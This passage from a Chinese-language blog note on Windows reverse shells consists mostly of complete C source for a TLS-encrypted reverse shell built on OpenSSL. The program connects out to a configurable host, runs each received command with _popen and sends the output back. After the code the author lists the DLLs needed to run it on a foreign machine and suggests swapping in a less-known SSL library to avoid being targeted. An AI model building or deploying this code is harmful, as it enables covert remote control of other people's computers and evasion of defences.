class="meta-string">&lt;ws2tcpip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/ssl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/applink.c&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment (lib, <span class="meta-string">&quot;Ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="comment">//#pragma comment (lib, &quot;Mswsock.lib&quot;)</span></span><br><span class="line"><span class="comment">//#pragma comment (lib, &quot;AdvApi32.lib&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEFAULT_BUFLEN 512</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FAIL    -1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WIN32_LEAN_AND_MEAN</span></span><br><span class="line"></span><br><span class="line"><span class="function">SOCKET <span class="title">OpenConnection</span><span class="params">(<span class="keyword">char</span>* hostname, <span class="keyword">char</span>* port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    SOCKET ConnectSocket = INVALID_SOCKET;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">addrinfo</span>* <span class="title">result</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">addrinfo</span>* <span class="title">ptr</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">addrinfo</span> <span class="title">hints</span>;</span></span><br><span class="line">    <span class="keyword">char</span> recvbuf[DEFAULT_BUFLEN];</span><br><span class="line">    <span class="keyword">int</span> iResult;</span><br><span class="line">    <span class="keyword">int</span> recvbuflen = DEFAULT_BUFLEN;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Initialize Winsock</span></span><br><span class="line">    iResult = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line">    <span class="keyword">if</span> (iResult != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WSAStartup failed with error: %d\n&quot;</span>, iResult);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ZeroMemory(&amp;hints, <span class="keyword">sizeof</span>(hints));</span><br><span class="line">    hints.ai_family = AF_UNSPEC;</span><br><span class="line">    hints.ai_socktype = SOCK_STREAM;</span><br><span class="line">    hints.ai_protocol = IPPROTO_TCP;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Resolve the server address and port</span></span><br><span class="line">    iResult = getaddrinfo(hostname, port, &amp;hints, &amp;result);</span><br><span class="line">    <span class="keyword">if</span> (iResult != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;getaddrinfo failed with error: %d\n&quot;</span>, iResult);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ptr = result;</span><br><span class="line">    <span class="comment">// Create a SOCKET for connecting to server</span></span><br><span class="line">    ConnectSocket = WSASocketW(ptr-&gt;ai_family, ptr-&gt;ai_socktype, ptr-&gt;ai_protocol, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//ConnectSocket = socket(ptr-&gt;ai_family, ptr-&gt;ai_socktype, ptr-&gt;ai_protocol);</span></span><br><span class="line">    <span class="keyword">if</span> (ConnectSocket == INVALID_SOCKET) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;socket failed with error: %ld\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Connect to server.</span></span><br><span class="line">    iResult = connect(ConnectSocket, ptr-&gt;ai_addr, (<span class="keyword">int</span>)ptr-&gt;ai_addrlen);</span><br><span class="line">    <span class="keyword">if</span> (iResult == SOCKET_ERROR) &#123;</span><br><span class="line">        closesocket(ConnectSocket);</span><br><span class="line">        ConnectSocket = INVALID_SOCKET;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ConnectSocket;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">SSL_CTX* <span class="title">InitCTX</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    OpenSSL_add_all_algorithms();  <span class="comment">/* Load cryptos, et.al. */</span></span><br><span class="line">    SSL_load_error_strings();   <span class="comment">/* Bring in and register error messages */</span></span><br><span class="line">    <span class="keyword">const</span> SSL_METHOD* method = TLSv1_2_client_method();  <span class="comment">/* Create new client-method instance */</span></span><br><span class="line">    SSL_CTX* ctx = SSL_CTX_new(method);   <span class="comment">/* Create new context */</span></span><br><span class="line">    <span class="keyword">if</span> (ctx == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ERR_print_errors_fp(<span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">abort</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ctx;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShowCerts</span><span class="params">(SSL* ssl)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    X509* cert;</span><br><span class="line">    <span class="keyword">char</span>* line;</span><br><span class="line">    cert = SSL_get_peer_certificate(ssl); <span class="comment">/* get the server&#x27;s certificate */</span></span><br><span class="line">    <span class="keyword">if</span> (cert != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Server certificates:\n&quot;</span>);</span><br><span class="line">        line = X509_NAME_oneline(X509_get_subject_name(cert), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Subject: %s\n&quot;</span>, line);</span><br><span class="line">        <span class="comment">//free(line);       /* free the malloc&#x27;ed string */</span></span><br><span class="line">        line = X509_NAME_oneline(X509_get_issuer_name(cert), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Issuer: %s\n&quot;</span>, line);</span><br><span class="line">        <span class="comment">//free(line);       /* free the malloc&#x27;ed string */</span></span><br><span class="line">        X509_free(cert);     <span class="comment">/* free the malloc&#x27;ed certificate copy */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Info: No client certificates configured.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">char</span>* <span class="title">execute</span><span class="params">(SSL* ssl, <span class="keyword">char</span>* cmdline)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    FILE* pipe;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* endstring = <span class="string">&quot; 2&gt;&amp;1&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">128</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//set endstring to get stderr</span></span><br><span class="line">    <span class="built_in">strncat</span>(cmdline, endstring, <span class="keyword">sizeof</span>(endstring));</span><br><span class="line">    </span><br><span class="line">	<span class="comment">//run command</span></span><br><span class="line">    pipe = _popen(cmdline, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!pipe) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;popen() failed!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// read till end of process:</span></span><br><span class="line">        <span class="keyword">while</span> (fgets(buffer, <span class="keyword">sizeof</span>(buffer), pipe) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        </span><br><span class="line">            SSL_write(ssl, buffer, <span class="built_in">strlen</span>(buffer));</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        _pclose(pipe);</span><br><span class="line">        <span class="keyword">return</span> buffer;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (...) &#123;</span><br><span class="line">        _pclose(pipe);</span><br><span class="line">        <span class="keyword">throw</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    SSL_library_init();</span><br><span class="line">    <span class="keyword">char</span> hostname[] = <span class="string">&quot;127.0.0.1&quot;</span>; <span class="comment">//change this</span></span><br><span class="line">    <span class="keyword">char</span> portnum[] = <span class="string">&quot;3000&quot;</span>; <span class="comment">//change this</span></span><br><span class="line"></span><br><span class="line">    SSL_CTX* ctx = InitCTX();</span><br><span class="line">    SOCKET server = OpenConnection(hostname, portnum);</span><br><span class="line">    SSL* ssl = SSL_new(ctx);      <span class="comment">/* create new SSL connection state */</span></span><br><span class="line">    SSL_set_fd(ssl, server);    <span class="comment">/* attach the socket descriptor */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (SSL_connect(ssl) == FAIL) &#123;</span><br><span class="line">        ERR_print_errors_fp(<span class="built_in">stderr</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n\nConnected with %s encryption\n&quot;</span>, SSL_get_cipher(ssl));</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* get any certs */</span></span><br><span class="line">        ShowCerts(ssl);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//set startup char</span></span><br><span class="line">            <span class="keyword">const</span> <span class="keyword">char</span> *startupchar = <span class="string">&quot;&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">/* get reply &amp; decrypt */</span></span><br><span class="line">            SSL_write(ssl, startupchar, <span class="built_in">strlen</span>(startupchar));</span><br><span class="line">            <span class="keyword">int</span> bytes = SSL_read(ssl, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">            buf[bytes<span class="number">-1</span>] = <span class="number">0</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//check recevied message</span></span><br><span class="line">            <span class="comment">//printf(&quot;Received: \&quot;%s\&quot;\n&quot;, buf);</span></span><br><span class="line"></span><br><span class="line">						<span class="comment">//set commmand to close connection</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;exit&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/*execute command &amp; encrypt &amp; send result */</span></span><br><span class="line">            execute(ssl, buf);</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* release connection state */</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;finish&quot;</span>);</span><br><span class="line">        SSL_free(ssl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* close socket */</span></span><br><span class="line">    closesocket(server);</span><br><span class="line">    <span class="comment">/* release context */</span></span><br><span class="line">    SSL_CTX_free(ctx);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>成果:<br><img src="/img/2022/windows-reverse-shell-note/windows-reverse-shell-note_12.png" alt=""> </p>
<p>然後實測了一下，如果要放到陌生環境去跑的話一共會需要這幾個 dll</p>
<ul>
<li>libcrypto-1_1-x64.dll</li>
<li>libssl-1_1-x64.dll</li>
<li>ucrtbased.dll</li>
<li>vcruntime140_1d.dll</li>
<li>vcruntime140d.dll</li>
</ul>
<p>然後如果覺得 openssl 太有名怕被針對的話，可以考慮一些分支的 ssl 像是 google 的 boringSSL 或是 libreSSL，其中 boringSSL 弄起來超麻煩，而 libreSSL 完全不知道要怎麼用…</p>


                
            </div>

            <!-- Comments -->
            
                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                    


                </div>
            
        </div>
    </div>
</article>

    <!-- Footer -->
    <hr />

<!-- Footer -->
<footer>
    <div class="container">
        <div class="row">
            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                <ul class="list-inline text-center">
                    

                    

                    
                        <li>
                            <a href="https://github.com/sda06407" target="_blank">
                                <span class="fa-stack fa-lg">
                                    <i class="fa fa-circle fa-stack-2x"></i>
                                    <i class="fa fa-github fa-stack-1x fa-inverse"></i>
                                </span>
                            </a>
                        </li>
                    

                    

                    

                    
                </ul>
                <p class="copyright text-muted">&copy; 2022 AStar<br></p>
                <p class="copyright text-muted">Original Theme <a target="_blank" href="http://startbootstrap.com/template-overviews/clean-blog/">Clean Blog</a> from <a href="http://startbootstrap.com/" target="_blank">Start Bootstrap</a></p>
                <p class="copyright text-muted">Adapted for <a target="_blank" href="https://hexo.io/">Hexo</a> by <a href="http://www.codeblocq.com/" target="_blank">Jonathan Klughertz</a></p>
            </div>
        </div>
    </div>
</footer>


    <!-- After footer scripts -->
    
<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Bootstrap -->
<script src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Disqus Comments -->



</body>

</html>